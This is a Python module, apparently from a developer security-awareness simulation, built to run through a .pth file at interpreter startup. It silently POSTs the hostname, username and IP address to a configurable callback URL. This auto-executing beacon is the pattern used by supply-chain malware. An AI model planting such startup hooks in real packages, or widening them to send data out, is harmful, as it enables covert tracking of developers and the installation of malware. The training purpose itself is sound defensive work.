
import getpass
import json
import os
import socket
import urllib.request
import urllib.error

# Configuration via environment variables with defaults
CALLBACK_URL = os.environ.get('RACMORPH_CALLBACK_URL', 'http://localhost:12331/api/callback')
CAMPAIGN_ID = os.environ.get('RACMORPH_CAMPAIGN_ID', 'DEV-OCT-2026')
CAMPAIGN_TOKEN = os.environ.get('RACMORPH_CAMPAIGN_TOKEN', 'CHANGE-ME')


def collect_training_telemetry():
    """
    Collect ONLY:
      - hostname
      - username
      - locally resolved IP address

    No environment variables, files, credentials, browser data,
    SSH keys, tokens, or other host information are collected.
    """

    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"

    try:
        username = getpass.getuser()
    except Exception:
        username = "unknown"

    try:
        ip = socket.gethostbyname(hostname)
    except Exception:
        ip = "unknown"

    return {
        "campaign_id": CAMPAIGN_ID,
        "campaign_token": CAMPAIGN_TOKEN,
        "event": "training_package_executed",
        "hostname": hostname,
        "username": username,
        "ip": ip,
    }


def send_training_event():
    """
    Send the limited training telemetry to the controlled collector.
    """

    if not CALLBACK_URL or "YOUR-CONTROLLED-DOMAIN" in CALLBACK_URL:
        return

    telemetry = collect_training_telemetry()

    body = json.dumps(telemetry).encode("utf-8")

    request = urllib.request.Request(
        CALLBACK_URL,
        data=body,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Developer-Security-Awareness-Simulation/1.0",
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            response.read(1024)

    except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError):
        # Training telemetry should never break Python startup.
        pass
    except Exception:
        pass


# Execute when imported by the .pth mechanism.
send_training_event()
